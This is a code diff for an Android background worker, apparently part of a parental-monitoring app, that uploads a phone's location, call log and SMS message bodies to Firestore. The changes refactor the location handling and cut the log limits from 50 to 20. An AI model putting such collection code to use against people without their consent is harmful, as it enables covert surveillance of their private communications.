@@ -23,6 +23,7 @@ class DataSyncWorker(ctx: Context, params: WorkerParameters) : CoroutineWorker(c
 
     override suspend fun doWork(): Result {
         return try {
+            // استخدام applicationContext لتجنب مشاكل الـ Context
             val parentId = SharedPrefsManager.getParentUid(applicationContext) ?: return Result.failure()
             val deviceId = SharedPrefsManager.getDeviceId(applicationContext) ?: return Result.failure()
 
@@ -30,12 +31,10 @@ class DataSyncWorker(ctx: Context, params: WorkerParameters) : CoroutineWorker(c
             val battery = getBatteryLevel()
             
             // 2. رفع الموقع
-            val location = getLastLocation()
+            val locationMap = getLastLocation()
             
-            // 3. رفع سجل المكالمات (آخر 50 مكالمة)
+            // 3. رفع السجلات
             val calls = getCallLogs()
-            
-            // 4. رفع الرسائل SMS (آخر 50 رسالة)
             val sms = getSmsLogs()
 
             // تحديث البيانات في Firestore
@@ -45,8 +44,8 @@ class DataSyncWorker(ctx: Context, params: WorkerParameters) : CoroutineWorker(c
                 "is_online" to true
             )
             
-            if (location != null) {
-                data["location"] = hashMapOf("lat" to location.latitude, "lng" to location.longitude)
+            if (locationMap != null) {
+                data["location"] = locationMap
             }
 
             val db = FirebaseFirestore.getInstance()
@@ -55,18 +54,9 @@ class DataSyncWorker(ctx: Context, params: WorkerParameters) : CoroutineWorker(c
             // تحديث البيانات الأساسية
             deviceRef.update(data).await()
             
-            // إضافة السجلات (Collections فرعية)
-            if (calls.isNotEmpty()) {
-                calls.forEach { call ->
-                    deviceRef.collection("calls").add(call)
-                }
-            }
-            
-            if (sms.isNotEmpty()) {
-                sms.forEach { s ->
-                    deviceRef.collection("sms").add(s)
-                }
-            }
+            // إضافة السجلات
+            calls.forEach { call -> deviceRef.collection("calls").add(call) }
+            sms.forEach { s -> deviceRef.collection("sms").add(s) }
 
             Result.success()
         } catch (e: Exception) {
@@ -80,10 +70,13 @@ class DataSyncWorker(ctx: Context, params: WorkerParameters) : CoroutineWorker(c
         return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
     }
 
-    private suspend fun getLastLocation(): Location? {
+    private suspend fun getLastLocation(): Map<String, Double>? {
         if (ContextCompat.checkSelfPermission(applicationContext, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
             val client = LocationServices.getFusedLocationProviderClient(applicationContext)
-            return client.lastLocation.await()
+            val loc: Location? = client.lastLocation.await()
+            if (loc != null) {
+                return mapOf("lat" to loc.latitude, "lng" to loc.longitude)
+            }
         }
         return null
     }
@@ -94,7 +87,7 @@ class DataSyncWorker(ctx: Context, params: WorkerParameters) : CoroutineWorker(c
         val calls = mutableListOf<Map<String, Any>>()
         val cursor = applicationContext.contentResolver.query(
             CallLog.Calls.CONTENT_URI,
-            null, null, null, "${CallLog.Calls.DATE} DESC LIMIT 50"
+            null, null, null, "${CallLog.Calls.DATE} DESC LIMIT 20"
         )
         
         cursor?.use {
@@ -106,7 +99,7 @@ class DataSyncWorker(ctx: Context, params: WorkerParameters) : CoroutineWorker(c
             while (it.moveToNext()) {
                 calls.add(mapOf(
                     "phone" to it.getString(numberIndex),
-                    "type" to it.getInt(typeIndex), // 1=Incoming, 2=Outgoing, 3=Missed
+                    "type" to it.getInt(typeIndex),
                     "timestamp" to it.getLong(dateIndex),
                     "duration" to it.getString(durationIndex)
                 ))
@@ -121,7 +114,7 @@ class DataSyncWorker(ctx: Context, params: WorkerParameters) : CoroutineWorker(c
         val msgs = mutableListOf<Map<String, Any>>()
         val cursor = applicationContext.contentResolver.query(
             Telephony.Sms.CONTENT_URI,
-            null, null, null, "${Telephony.Sms.DATE} DESC LIMIT 50"
+            null, null, null, "${Telephony.Sms.DATE} DESC LIMIT 20"
         )
 
         cursor?.use {
@@ -135,7 +128,7 @@ class DataSyncWorker(ctx: Context, params: WorkerParameters) : CoroutineWorker(c
                     "phone" to it.getString(addressIndex),
                     "body" to it.getString(bodyIndex),
                     "timestamp" to it.getLong(dateIndex),
-                    "type" to it.getInt(typeIndex) // 1=Received, 2=Sent
+                    "type" to it.getInt(typeIndex)
                 ))
             }
         }
